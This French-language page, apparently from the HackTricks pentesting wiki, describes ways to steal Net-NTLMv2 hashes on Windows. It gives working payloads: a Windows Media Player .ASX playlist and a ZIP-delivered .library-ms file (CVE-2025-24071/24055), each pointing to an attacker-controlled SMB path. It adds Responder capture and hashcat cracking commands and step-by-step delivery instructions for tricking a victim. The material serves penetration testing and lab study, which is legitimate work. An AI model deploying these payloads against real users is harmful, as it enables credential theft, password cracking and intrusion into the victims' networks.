# Endroits pour voler NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consultez toutes les excellentes idées de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) depuis le téléchargement d'un fichier Microsoft Word en ligne jusqu'à la source ntlm leaks : https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md et [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Listes de lecture Windows Media Player (.ASX/.WAX)

Si vous pouvez amener une cible à ouvrir ou prévisualiser une liste de lecture Windows Media Player que vous contrôlez, vous pouvez leak Net‑NTLMv2 en pointant l'entrée vers un UNC path. WMP tentera de récupérer le média référencé via SMB et s'authentifiera implicitement.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flux de collecte et de cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gère de manière non sécurisée les fichiers .library-ms lorsqu'ils sont ouverts directement depuis une archive ZIP. Si la définition de la bibliothèque pointe vers un chemin UNC distant (par ex., \\attacker\share), le simple fait de parcourir/lancer le .library-ms à l'intérieur du ZIP fait qu'Explorer énumère le UNC et émet une authentification NTLM vers l'attaquant. Cela génère un NetNTLMv2 qui peut être cracked hors ligne ou potentiellement relayed.

Fichier .library-ms minimal pointant vers un UNC de l'attaquant
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Étapes opérationnelles
- Créez le fichier .library-ms avec le XML ci‑dessus (définissez votre IP/hostname).
- Zippez-le (sous Windows : Send to → Compressed (zipped) folder) et transmettez le ZIP à la cible.
- Lancez un NTLM capture listener et attendez que la victime ouvre le .library-ms depuis l'intérieur du ZIP.


## Références
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
